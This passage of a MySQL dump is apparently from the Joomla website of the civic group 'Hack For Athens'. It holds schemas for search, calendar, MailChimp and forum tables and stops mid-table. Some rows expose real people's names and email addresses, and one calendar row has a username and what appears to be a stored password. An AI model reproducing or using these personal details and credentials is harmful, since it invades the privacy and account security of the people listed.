-- Dumping data for table `hfa_finder_links_termsa`
--

LOCK TABLES `hfa_finder_links_termsa` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_termsa` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_termsa` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_termsb`
--

DROP TABLE IF EXISTS `hfa_finder_links_termsb`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_termsb` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_termsb`
--

LOCK TABLES `hfa_finder_links_termsb` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_termsb` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_termsb` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_termsc`
--

DROP TABLE IF EXISTS `hfa_finder_links_termsc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_termsc` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_termsc`
--

LOCK TABLES `hfa_finder_links_termsc` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_termsc` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_termsc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_termsd`
--

DROP TABLE IF EXISTS `hfa_finder_links_termsd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_termsd` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_termsd`
--

LOCK TABLES `hfa_finder_links_termsd` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_termsd` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_termsd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_termse`
--

DROP TABLE IF EXISTS `hfa_finder_links_termse`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_termse` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_termse`
--

LOCK TABLES `hfa_finder_links_termse` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_termse` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_termse` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_termsf`
--

DROP TABLE IF EXISTS `hfa_finder_links_termsf`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_termsf` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_termsf`
--

LOCK TABLES `hfa_finder_links_termsf` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_termsf` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_termsf` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_taxonomy`
--

DROP TABLE IF EXISTS `hfa_finder_taxonomy`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_taxonomy` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL,
  `state` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `access` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `ordering` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `parent_id` (`parent_id`),
  KEY `state` (`state`),
  KEY `ordering` (`ordering`),
  KEY `access` (`access`),
  KEY `idx_parent_published` (`parent_id`,`state`,`access`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_taxonomy`
--

LOCK TABLES `hfa_finder_taxonomy` WRITE;
/*!40000 ALTER TABLE `hfa_finder_taxonomy` DISABLE KEYS */;
INSERT INTO `hfa_finder_taxonomy` VALUES (1,0,'ROOT',0,0,0);
/*!40000 ALTER TABLE `hfa_finder_taxonomy` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_taxonomy_map`
--

DROP TABLE IF EXISTS `hfa_finder_taxonomy_map`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_taxonomy_map` (
  `link_id` int(10) unsigned NOT NULL,
  `node_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`node_id`),
  KEY `link_id` (`link_id`),
  KEY `node_id` (`node_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_taxonomy_map`
--

LOCK TABLES `hfa_finder_taxonomy_map` WRITE;
/*!40000 ALTER TABLE `hfa_finder_taxonomy_map` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_taxonomy_map` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_terms`
--

DROP TABLE IF EXISTS `hfa_finder_terms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_terms` (
  `term_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `weight` float unsigned NOT NULL DEFAULT '0',
  `soundex` varchar(75) NOT NULL,
  `links` int(10) NOT NULL DEFAULT '0',
  `language` char(3) NOT NULL DEFAULT '',
  PRIMARY KEY (`term_id`),
  UNIQUE KEY `idx_term` (`term`),
  KEY `idx_term_phrase` (`term`,`phrase`),
  KEY `idx_stem_phrase` (`stem`,`phrase`),
  KEY `idx_soundex_phrase` (`soundex`,`phrase`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_terms`
--

LOCK TABLES `hfa_finder_terms` WRITE;
/*!40000 ALTER TABLE `hfa_finder_terms` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_terms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_terms_common`
--

DROP TABLE IF EXISTS `hfa_finder_terms_common`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_terms_common` (
  `term` varchar(75) NOT NULL,
  `language` varchar(3) NOT NULL,
  KEY `idx_word_lang` (`term`,`language`),
  KEY `idx_lang` (`language`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_terms_common`
--

LOCK TABLES `hfa_finder_terms_common` WRITE;
/*!40000 ALTER TABLE `hfa_finder_terms_common` DISABLE KEYS */;
INSERT INTO `hfa_finder_terms_common` VALUES ('a','en'),('about','en'),('after','en'),('ago','en'),('all','en'),('am','en'),('an','en'),('and','en'),('ani','en'),('any','en'),('are','en'),('aren\'t','en'),('as','en'),('at','en'),('be','en'),('but','en'),('by','en'),('for','en'),('from','en'),('get','en'),('go','en'),('how','en'),('if','en'),('in','en'),('into','en'),('is','en'),('isn\'t','en'),('it','en'),('its','en'),('me','en'),('more','en'),('most','en'),('must','en'),('my','en'),('new','en'),('no','en'),('none','en'),('not','en'),('noth','en'),('nothing','en'),('of','en'),('off','en'),('often','en'),('old','en'),('on','en'),('onc','en'),('once','en'),('onli','en'),('only','en'),('or','en'),('other','en'),('our','en'),('ours','en'),('out','en'),('over','en'),('page','en'),('she','en'),('should','en'),('small','en'),('so','en'),('some','en'),('than','en'),('thank','en'),('that','en'),('the','en'),('their','en'),('theirs','en'),('them','en'),('then','en'),('there','en'),('these','en'),('they','en'),('this','en'),('those','en'),('thus','en'),('time','en'),('times','en'),('to','en'),('too','en'),('true','en'),('under','en'),('until','en'),('up','en'),('upon','en'),('use','en'),('user','en'),('users','en'),('veri','en'),('version','en'),('very','en'),('via','en'),('want','en'),('was','en'),('way','en'),('were','en'),('what','en'),('when','en'),('where','en'),('whi','en'),('which','en'),('who','en'),('whom','en'),('whose','en'),('why','en'),('wide','en'),('will','en'),('with','en'),('within','en'),('without','en'),('would','en'),('yes','en'),('yet','en'),('you','en'),('your','en'),('yours','en');
/*!40000 ALTER TABLE `hfa_finder_terms_common` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_tokens`
--

DROP TABLE IF EXISTS `hfa_finder_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_tokens` (
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `weight` float unsigned NOT NULL DEFAULT '1',
  `context` tinyint(1) unsigned NOT NULL DEFAULT '2',
  `language` char(3) NOT NULL DEFAULT '',
  KEY `idx_word` (`term`),
  KEY `idx_context` (`context`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_tokens`
--

LOCK TABLES `hfa_finder_tokens` WRITE;
/*!40000 ALTER TABLE `hfa_finder_tokens` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_tokens_aggregate`
--

DROP TABLE IF EXISTS `hfa_finder_tokens_aggregate`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_tokens_aggregate` (
  `term_id` int(10) unsigned NOT NULL,
  `map_suffix` char(1) NOT NULL,
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `term_weight` float unsigned NOT NULL,
  `context` tinyint(1) unsigned NOT NULL DEFAULT '2',
  `context_weight` float unsigned NOT NULL,
  `total_weight` float unsigned NOT NULL,
  `language` char(3) NOT NULL DEFAULT '',
  KEY `token` (`term`),
  KEY `keyword_id` (`term_id`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_tokens_aggregate`
--

LOCK TABLES `hfa_finder_tokens_aggregate` WRITE;
/*!40000 ALTER TABLE `hfa_finder_tokens_aggregate` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_tokens_aggregate` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_types`
--

DROP TABLE IF EXISTS `hfa_finder_types`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_types` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL,
  `mime` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `title` (`title`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_types`
--

LOCK TABLES `hfa_finder_types` WRITE;
/*!40000 ALTER TABLE `hfa_finder_types` DISABLE KEYS */;
INSERT INTO `hfa_finder_types` VALUES (1,'Category',''),(2,'Contact',''),(3,'Article',''),(4,'News Feed',''),(5,'Web Link','');
/*!40000 ALTER TABLE `hfa_finder_types` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_gcalendar`
--

DROP TABLE IF EXISTS `hfa_gcalendar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_gcalendar` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `calendar_id` text NOT NULL,
  `name` text NOT NULL,
  `magic_cookie` text NOT NULL,
  `username` varchar(255) DEFAULT NULL,
  `password` text,
  `color` text NOT NULL,
  `access` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `access_content` tinyint(3) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_gcalendar`
--

LOCK TABLES `hfa_gcalendar` WRITE;
/*!40000 ALTER TABLE `hfa_gcalendar` DISABLE KEYS */;
INSERT INTO `hfa_gcalendar` VALUES (1,'blackboxoperations.com_qmsaadk734nvu3nnsjtlhuvg58%40group.calendar.google.com','Hack For Athens','http://www.google.com/calendar/feeds/blackboxoperations.com_qmsaadk734nvu3nnsjtlhuvg58%40group.calendar.google.com/public/basic','kstorm','1E5144 94A41741751','B1440E',1,1);
/*!40000 ALTER TABLE `hfa_gcalendar` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_joomailermailchimpintegration`
--

DROP TABLE IF EXISTS `hfa_joomailermailchimpintegration`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_joomailermailchimpintegration` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `email` varchar(50) NOT NULL,
  `listid` varchar(32) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_joomailermailchimpintegration`
--

LOCK TABLES `hfa_joomailermailchimpintegration` WRITE;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration` DISABLE KEYS */;
INSERT INTO `hfa_joomailermailchimpintegration` VALUES (1,282,'stormymx@gmail.com','1e4599e8a6'),(2,287,'jinayang@uga.edu','1e4599e8a6'),(3,291,'wade@rainmakerwebdesign.com','1e4599e8a6'),(4,293,'yi003882342914102@163.com','1e4599e8a6'),(5,294,'mike@phil-athens.com','1e4599e8a6'),(6,297,'marilyn@gtf.org','1e4599e8a6'),(7,296,'glennstovall@gmail.com','1e4599e8a6'),(8,298,'jambaker@uga.edu','1e4599e8a6'),(9,306,'henryoddi@gmail.com','1e4599e8a6');
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_joomailermailchimpintegration_campaigns`
--

DROP TABLE IF EXISTS `hfa_joomailermailchimpintegration_campaigns`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_joomailermailchimpintegration_campaigns` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `list_id` varchar(255) NOT NULL,
  `list_name` text NOT NULL,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `subject` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `from_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `from_email` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `reply` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `confirmation` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `creation_date` int(22) NOT NULL,
  `recipients` int(22) NOT NULL,
  `sent` tinyint(4) NOT NULL,
  `cid` varchar(255) NOT NULL,
  `cdata` text NOT NULL,
  `folder_id` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_joomailermailchimpintegration_campaigns`
--

LOCK TABLES `hfa_joomailermailchimpintegration_campaigns` WRITE;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_campaigns` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_campaigns` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_joomailermailchimpintegration_crm`
--

DROP TABLE IF EXISTS `hfa_joomailermailchimpintegration_crm`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_joomailermailchimpintegration_crm` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `crm` varchar(256) NOT NULL,
  `params` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_joomailermailchimpintegration_crm`
--

LOCK TABLES `hfa_joomailermailchimpintegration_crm` WRITE;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_crm` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_crm` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_joomailermailchimpintegration_crm_users`
--

DROP TABLE IF EXISTS `hfa_joomailermailchimpintegration_crm_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_joomailermailchimpintegration_crm_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `crm` varchar(20) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_joomailermailchimpintegration_crm_users`
--

LOCK TABLES `hfa_joomailermailchimpintegration_crm_users` WRITE;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_crm_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_crm_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_joomailermailchimpintegration_custom_fields`
--

DROP TABLE IF EXISTS `hfa_joomailermailchimpintegration_custom_fields`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_joomailermailchimpintegration_custom_fields` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `listID` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `framework` varchar(255) NOT NULL DEFAULT '',
  `dbfield` varchar(255) NOT NULL DEFAULT '',
  `grouping_id` varchar(255) NOT NULL DEFAULT '',
  `type` varchar(5) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_joomailermailchimpintegration_custom_fields`
--

LOCK TABLES `hfa_joomailermailchimpintegration_custom_fields` WRITE;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_custom_fields` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_custom_fields` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_joomailermailchimpintegration_misc`
--

DROP TABLE IF EXISTS `hfa_joomailermailchimpintegration_misc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_joomailermailchimpintegration_misc` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `listid` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_joomailermailchimpintegration_misc`
--

LOCK TABLES `hfa_joomailermailchimpintegration_misc` WRITE;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_misc` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_joomailermailchimpintegration_misc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_joomailermailchimpsignup`
--

DROP TABLE IF EXISTS `hfa_joomailermailchimpsignup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_joomailermailchimpsignup` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fname` varchar(100) DEFAULT NULL,
  `lname` varchar(100) DEFAULT NULL,
  `email` varchar(100) NOT NULL,
  `groupings` text NOT NULL,
  `merges` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_joomailermailchimpsignup`
--

LOCK TABLES `hfa_joomailermailchimpsignup` WRITE;
/*!40000 ALTER TABLE `hfa_joomailermailchimpsignup` DISABLE KEYS */;
INSERT INTO `hfa_joomailermailchimpsignup` VALUES (9,'Leslie','','lgrove@gmail.com','',''),(10,'Kevin','Quinn','kevin@kungquinn.com','',''),(12,'abdulrahman','','abdulrahmannani@gmail.com','',''),(13,'Chris','Sparnicht','chris@greenman.us','',''),(14,'Peter','Walker','peterw@suprafax.net','','');
/*!40000 ALTER TABLE `hfa_joomailermailchimpsignup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_aliases`
--

DROP TABLE IF EXISTS `hfa_kunena_aliases`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_aliases` (
  `alias` varchar(255) NOT NULL,
  `type` varchar(10) NOT NULL,
  `item` varchar(32) NOT NULL,
  `state` tinyint(4) NOT NULL DEFAULT '0',
  UNIQUE KEY `alias` (`alias`),
  KEY `state` (`state`),
  KEY `item` (`item`),
  KEY `type` (`type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_aliases`
--

LOCK TABLES `hfa_kunena_aliases` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_aliases` DISABLE KEYS */;
INSERT INTO `hfa_kunena_aliases` VALUES ('announcement','view','announcement',1),('category','view','category',1),('category/create','layout','category.create',1),('category/default','layout','category.default',1),('category/edit','layout','category.edit',1),('category/manage','layout','category.manage',1),('category/moderate','layout','category.moderate',1),('category/user','layout','category.user',1),('common','view','common',1),('community','catid','8',0),('create','layout','category.create',0),('credits','view','credits',1),('default','layout','category.default',0),('edit','layout','category.edit',0),('engage-athens','catid','8',0),('faq','catid','4',0),('general-information','catid','2',0),('home','view','home',1),('main-forum','catid','1',1),('manage','layout','category.manage',0),('misc','view','misc',1),('moderate','layout','category.moderate',0),('safe-water-athens','catid','9',0),('search','view','search',1),('statistics','view','statistics',1),('suggestion-box','catid','3',1),('team-internets','catid','7',0),('teams','catid','5',0),('the-hotdawgs','catid','6',0),('topic','view','topic',1),('topics','view','topics',1),('user','view','user',1),('welcome-mat','catid','2',1);
/*!40000 ALTER TABLE `hfa_kunena_aliases` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_announcement`
--

DROP TABLE IF EXISTS `hfa_kunena_announcement`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_announcement` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `title` tinytext NOT NULL,
  `created_by` int(11) NOT NULL DEFAULT '0',
  `sdescription` text NOT NULL,
  `description` text NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `ordering` tinyint(4) NOT NULL DEFAULT '0',
  `showdate` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_announcement`
--

LOCK TABLES `hfa_kunena_announcement` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_announcement` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunena_announcement` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_attachments`
--

DROP TABLE IF EXISTS `hfa_kunena_attachments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_attachments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `mesid` int(11) NOT NULL DEFAULT '0',
  `userid` int(11) NOT NULL DEFAULT '0',
  `hash` char(32) DEFAULT NULL,
  `size` int(11) DEFAULT NULL,
  `folder` varchar(255) NOT NULL,
  `filetype` varchar(20) NOT NULL,
  `filename` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `mesid` (`mesid`),
  KEY `userid` (`userid`),
  KEY `hash` (`hash`),
  KEY `filename` (`filename`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_attachments`
--

LOCK TABLES `hfa_kunena_attachments` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_attachments` DISABLE KEYS */;
INSERT INTO `hfa_kunena_attachments` VALUES (2,18,305,'b63f65836d1fd7bfbd2def40d555a046',1229506,'media/kunena/attachments/305','','comm-unity.pptx'),(3,19,324,'f1d9286e0a354ffaab03b695db822a77',1508202,'media/kunena/attachments/324','','affordableinternetpres.pptx'),(4,20,313,'f45fa4128acd66bb05e5a7502ef7cf21',4587802,'media/kunena/attachments/313','','SafeWaterAthens.zip'),(6,1,254,'d3f78795331c7a869c92316ca5881d37',364811,'media/kunena/attachments/254','','NationalDayofCivicHacking1.pptx'),(7,22,274,'389421670c4df36890c7e2e75c9d4c74',2417005,'media/kunena/attachments/274','','safewaterathens.zip');
/*!40000 ALTER TABLE `hfa_kunena_attachments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_categories`
--

DROP TABLE IF EXISTS `hfa_kunena_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_categories` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `parent_id` int(11) DEFAULT '0',
  `name` tinytext,
  `alias` varchar(255) NOT NULL,
  `icon_id` tinyint(4) NOT NULL DEFAULT '0',
  `locked` tinyint(4) NOT NULL DEFAULT '0',
  `accesstype` varchar(20) NOT NULL DEFAULT 'joomla.level',
  `access` int(11) NOT NULL DEFAULT '0',
  `pub_access` int(11) NOT NULL DEFAULT '1',
  `pub_recurse` tinyint(4) DEFAULT '1',
  `admin_access` int(11) NOT NULL DEFAULT '0',
  `admin_recurse` tinyint(4) DEFAULT '1',
  `ordering` smallint(6) NOT NULL DEFAULT '0',
  `published` tinyint(4) NOT NULL DEFAULT '0',
  `channels` text,
  `checked_out` tinyint(4) NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
